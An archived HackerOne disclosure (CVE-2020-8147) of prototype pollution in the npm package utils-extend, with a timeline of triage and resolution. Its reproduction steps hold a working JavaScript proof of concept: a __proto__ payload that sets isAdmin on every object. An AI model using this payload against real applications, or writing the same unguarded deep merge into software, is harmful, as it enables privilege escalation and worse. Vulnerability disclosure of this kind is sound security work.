---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-04-02
submitted: 2020-02-21T07:35:31.190Z
bounty_usd: null
votes: 4
cve: "CVE-2020-8147"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "tuo4n8"
source: "https://hackerone.com/reports/801522"
title: "[utils-extend] Prototype pollution "
---
# [utils-extend] Prototype pollution 

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2020-04-02

- Report: [https://hackerone.com/reports/801522](https://hackerone.com/reports/801522)
- CWE: Modification of Assumed-Immutable Data (MAID) | CVE: CVE-2020-8147
- Submitted: 2020-02-21T07:35:31.190Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report `prototype polution` in `utils-extend`
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** utils-extend
**version:** 1.0.8
**npm page:** `https://www.npmjs.com/package/utils-extend`

## Module Description

> Extend nodejs util api, and it is light weight and simple.

## Module Stats

[1] weekly downloads : **129,956**

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:

1. npm install --save utils-extend
2. create file index.js with content :

```javascript
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

3. run `node index.js` => true 

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] : N
- I opened an issue in the related repository: [Y/N]  : N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

## Timeline

- **Report Filed**
- **Report Triaged**
- **2020-02-27** @tuo4n8: hi @lugtag 
Any update for this bro
- **Report Vulnerability Types Updated**
- **2020-03-17** @h1_analyst_jack: The team is working to bring outside parties into this report as the report must be fixed by a third party. It is up to the team as to whether it can be fixed after that point or not.
- **Report Resolved**
- **Report Severity Updated**
- **Agreed On Going Public**
- **2020-04-02** @tuo4n8: Hi @marcinhoppe 
Thank you so much for your response.
So can I have a CVE bro?
Regards
- **2020-04-02** @marcinhoppe: Yes, I will request a CVE.
- **Agreed On Going Public**
- **Report Became Public**
- **2020-04-02** @tuo4n8: Thanks you so much @marcinhoppe
- **Changed Scope**
